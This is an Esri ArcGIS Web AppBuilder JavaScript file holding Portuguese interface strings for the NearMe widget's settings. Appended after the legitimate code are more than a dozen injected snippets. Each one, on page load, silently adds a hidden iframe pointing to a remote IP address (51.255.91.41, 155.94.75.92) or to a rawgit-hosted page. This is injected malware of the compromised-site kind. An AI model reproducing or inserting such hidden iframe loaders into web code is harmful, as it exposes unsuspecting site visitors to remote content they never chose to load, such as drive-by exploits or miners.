// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define({"widgets/NearMe/setting/nls/strings":{units:{miles:{displayText:"Milhas",acronym:"mi"},kilometers:{displayText:"Quil\u00f4metros",acronym:"km"},feet:{displayText:"P\u00e9s",acronym:"p\u00e9s"},meters:{displayText:"Metros",acronym:"m"}},searchSourceSetting:{searchSourceSettingTabTitle:"Configura\u00e7\u00f5es da Fonte de Pesquisa",searchSourceSettingTitle:"Configura\u00e7\u00f5es da Fonte de Pesquisa",searchSourceSettingTitleHintText:"Adicione e configure servi\u00e7os de geoc\u00f3digo ou camadas de fei\u00e7\u00e3o como fontes de pesquisa. Estas fontes especificadas determinam o que \u00e9 pesquis\u00e1vel dentro da caixa de pesquisa.",
addSearchSourceLabel:"Adicionar Fonte de Pesquisa",featureLayerLabel:"Camada de Fei\u00e7\u00e3o",geocoderLabel:"Geocodificador",nameTitle:"Nome",generalSettingLabel:"Configura\u00e7\u00f5es Gerais",allPlaceholderLabel:"Texto de local reservado para pesquisar todos:",allPlaceholderHintText:"Sugest\u00e3o: Insira o texto a ser mostrado como reservado ao pesquisar todas as camadas e geocodificador",generalSettingCheckboxLabel:"Mostrar pop-up do local ou fei\u00e7\u00e3o localizada",countryCode:"C\u00f3digos de Regi\u00e3o e Pa\u00eds",
countryCodeEg:"por exemplo ",countryCodeHint:"Deixar este valor em branco pesquisar\u00e1 todos os pa\u00edses e regi\u00f5es",questionMark:"?",searchInCurrentMapExtent:"Somente pesquisar na extens\u00e3o de mapa atual",zoomScale:"Escala de Zoom",locatorUrl:"URL do Geocodificador",locatorName:"Nome do Geocodificador",locatorExample:"Exemplo",locatorWarning:"Esta vers\u00e3o do servi\u00e7o de geocodifica\u00e7\u00e3o n\u00e3o \u00e9 suportado. O widget suporta servi\u00e7o de geocodifica\u00e7\u00e3o 10.0 e superior.",
locatorTips:"As sugest\u00f5es n\u00e3o est\u00e3o dispon\u00edveis, pois o servi\u00e7o de geocodifica\u00e7\u00e3o n\u00e3o suporta o recursos de sugest\u00e3o.",layerSource:"Origem da Camada",setLayerSource:"Configurar Origem da Camada",setGeocoderURL:"Configurar URL do Geocodificador",searchLayerTips:"As sugest\u00f5es n\u00e3o est\u00e3o dispon\u00edveis, pois o servi\u00e7o da fei\u00e7\u00e3o n\u00e3o suporta o recursos de pagina\u00e7\u00e3o.",placeholder:"Texto do Placeholder",searchFields:"Pesquisar Campos",
displayField:"Campo de Visualiza\u00e7\u00e3o",exactMatch:"Combina\u00e7\u00e3o Exata",maxSuggestions:"M\u00e1ximo de Sugest\u00f5es",maxResults:"M\u00e1ximo de Resultados",enableLocalSearch:"Habilitar pesquisa de local",minScale:"Escala M\u00edn",minScaleHint:"Quando a escala do mapa for maior que esta escala, a pesquisa de local ser\u00e1 aplicada",radius:"Raio",radiusHint:"Especifica o raio de uma \u00e1rea ao redor do centro do mapa atual que \u00e9 utilizado para impulsionar o grau de candidatos de geocodifica\u00e7\u00e3o de forma que os candidatos mais pr\u00f3ximos ao local sejam retornados primeiro",
meters:"Metros",setSearchFields:"Configurar Campos de Pesquisa",set:"Configurar",fieldName:"Nome",invalidUrlTip:"A URL ${URL} \u00e9 inv\u00e1lida ou inacess\u00edvel."},searchSetting:{searchSettingTabTitle:"Configura\u00e7\u00f5es da Pesquisa",defaultBufferDistanceLabel:"Configurar dist\u00e2ncia de buffer padr\u00e3o",maxResultCountLabel:"N\u00famero limite de resultados",maxResultCountHintLabel:"Sugest\u00e3o: Configurar o n\u00famero m\u00e1ximo de resultados vis\u00edveis. O valor de 1 retornar\u00e1 a fei\u00e7\u00e3o mais pr\u00f3xima",
maxBufferDistanceLabel:"Configurar dist\u00e2ncia m\u00e1xima de buffer",bufferDistanceUnitLabel:"Unidades de dist\u00e2ncia do buffer",defaultBufferHintLabel:"Sugest\u00e3o: Configurar valor padr\u00e3o para controle deslizante de buffer",maxBufferHintLabel:"Sugest\u00e3o: Configurar valor m\u00e1ximo para controle deslizante de buffer",bufferUnitLabel:"Sugest\u00e3o: Defina a unidade para criar buffer",selectGraphicLocationSymbol:"S\u00edmbolo de local ou endere\u00e7o",graphicLocationSymbolHintText:"Sugest\u00e3o: S\u00edmbolo para endere\u00e7o pesquisado ou local clicado",
addressLocationPolygonHintText:"Sugest\u00e3o: S\u00edmbolo para camada de pol\u00edgono pesquisada",popupTitleForPolygon:"Selecionar pol\u00edgono para localiza\u00e7\u00e3o de endere\u00e7o selecionado",popupTitleForPolyline:"Selecionar linha para localiza\u00e7\u00e3o de endere\u00e7o",addressLocationPolylineHintText:"Sugest\u00e3o: S\u00edmbolo para camada de polilinha pesquisada",fontColorLabel:"Selecionar cor da fonte para resultados da pesquisa",fontColorHintText:"Sugest\u00e3o: Cor da fonte de resultados da pesquisa",
zoomToSelectedFeature:"Zoom para fei\u00e7\u00e3o selecionada",zoomToSelectedFeatureHintText:"Sugest\u00e3o: Ampliar na fei\u00e7\u00e3o selecionada, ao inv\u00e9s do buffer",intersectSearchLocation:"Retornar pol\u00edgonos de intersec\u00e7\u00e3o",intersectSearchLocationHintText:"Sugest\u00e3o: Retorne pol\u00edgonos contendo o local pesquisado, ao inv\u00e9s de pol\u00edgonos dentro do buffer",enableProximitySearch:"Habilitar pesquisa de proximidade",enableProximitySearchHintText:"Dica: Habilite o recurso de pesquisa para locais pr\u00f3ximos de um resultado selecionado",
bufferVisibilityLabel:"Configurar visibilidade do buffer",bufferVisibilityHintText:"Sugest\u00e3o: O buffer ser\u00e1 exibido no mapa",bufferColorLabel:"Configurar s\u00edmbolo do buffer",bufferColorHintText:"Sugest\u00e3o: Selecione cor e transpar\u00eancia do buffer",searchLayerResultLabel:"Desenhar somente resultados da camada selecionada",searchLayerResultHint:"Sugest\u00e3o: Somente a camada selecionada nos resultados da pesquisa desenhar\u00e1 no mapa",showToolToSelectLabel:"Configurar bot\u00e3o de localiza\u00e7\u00e3o",
showToolToSelectHintText:"Sugest\u00e3o: Forne\u00e7a um bot\u00e3o para configurar a localiza\u00e7\u00e3o no mapa em vez de sempre configurar a localiza\u00e7\u00e3o quando o mapa for clicado",geoDesicParamLabel:"Utilizar buffer geod\u00e9sico",geoDesicParamHintText:"Sugest\u00e3o: Utilize buffer geod\u00e9sico em vez de buffer Euclideano (plana)"},layerSelector:{selectLayerLabel:"Selecionar camadas de pesquisa",layerSelectionHint:"Sugest\u00e3o: Utilize o bot\u00e3o configurar para selecionar camadas",
addLayerButton:"Configurar"},routeSetting:{routeSettingTabTitle:"Configura\u00e7\u00f5es de Dire\u00e7\u00f5es",routeServiceUrl:"Servi\u00e7o de Rota",buttonSet:"Configurar",routeServiceUrlHintText:"Sugest\u00e3o: Clique em \u00e2\u20ac\u02dcSet\u00e2\u20ac\u2122 para procurar e selecionar um servi\u00e7o de rota",directionLengthUnit:"Unidades do comprimento de dire\u00e7\u00e3o",unitsForRouteHintText:"Sugest\u00e3o: Utilizado para exibir unidades para rota",selectRouteSymbol:"Selecionar s\u00edmbolo para exibir rota",
routeSymbolHintText:"Sugest\u00e3o: Utilizado para exibir s\u00edmbolo de linha da rota",routingDisabledMsg:"Para habilitar dire\u00e7\u00f5es, garanta que a rota esteja habilitada no item das configura\u00e7\u00f5es do aplicativo."},symbologySetting:{symbologySettingTabTitle:"Configura\u00e7\u00f5es da simbologia",addSymbologyBtnLabel:"Adicionar Novos S\u00edmbolos",layerNameTitle:"Nome da Camada",fieldTitle:"Campo",valuesTitle:"Valores",symbolTitle:"S\u00edmbolo",actionsTitle:"A\u00e7\u00f5es",
invalidConfigMsg:"Duplicar campo : ${fieldName} para camada : ${layerName}"},filterSetting:{filterSettingTabTitle:"Configura\u00e7\u00f5es de Filtro",addTaskTip:"Adicione um ou mais filtros na camada de pesquisa selecionada e configure os par\u00e2metros para cada uma delas.",enableMapFilter:"Remove o filtro de camada pr\u00e9-configurado do mapa.",newFilter:"Novo filtro",filterExpression:"Express\u00e3o de filtro",layerDefaultSymbolTip:"Utilizar s\u00edmbolo padr\u00e3o da camada",uploadImage:"Carregar uma imagem",
selectLayerTip:"Selecione uma camada.",setTitleTip:"Configure um t\u00edtulo.",noTasksTip:'Nenhum filtro configurado. Clique em "${newFilter}" para adicionar uma nova.',collapseFiltersTip:"Recolha as express\u00f5es de filtro (se houver alguma) quando o widget for aberto"},networkServiceChooser:{arcgislabel:"Adicionar do ArcGIS Online",serviceURLabel:"Adicionar URL de Servi\u00e7o",routeURL:"URL da Rota",validateRouteURL:"Validar",exampleText:"Exemplo",hintRouteURL1:"https://route.arcgis.com/arcgis/rest/services/World/Route/NAServer/",
hintRouteURL2:"https://route.arcgis.com/arcgis/rest/services/World/Route/NAServer/Route_World",invalidRouteServiceURL:"Especifique um servi\u00e7o de Rota v\u00e1lido.",rateLimitExceeded:"Limite de taxa excedido. Tente novamente mais tarde.",errorInvokingService:"O nome de usu\u00e1rio ou senha est\u00e1 incorreta."},errorStrings:{bufferErrorString:"Inisra um valor num\u00e9rico v\u00e1lido.",selectLayerErrorString:"Selecione as camadas para pesquisar.",invalidDefaultValue:"A dist\u00e2ncia de buffer padr\u00e3o n\u00e3o pode estar em branco. Especifique a dist\u00e2ncia de buffer",
invalidMaximumValue:"A dist\u00e2ncia de buffer m\u00e1xima n\u00e3o pode estar em branco. Especifique a dist\u00e2ncia de buffer",defaultValueLessThanMax:"Especifique a dist\u00e2ncia de buffer padr\u00e3o dentro do limite m\u00e1ximo",defaultBufferValueGreaterThanOne:"A dist\u00e2ncia de buffer padr\u00e3o n\u00e3o pode ser menos que 0",maximumBufferValueGreaterThanOne:"Especifique a dist\u00e2ncia de buffer m\u00e1xima maior que 0",invalidMaximumResultCountValue:"Especifique o valor v\u00e1lido para a contagem de resultado m\u00e1ximo",
invalidSearchSources:"Configura\u00e7\u00f5es de fonte de pesquisa inv\u00e1lida"},symbolPickerPreviewText:"Visualizar:",_localized:{}}});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});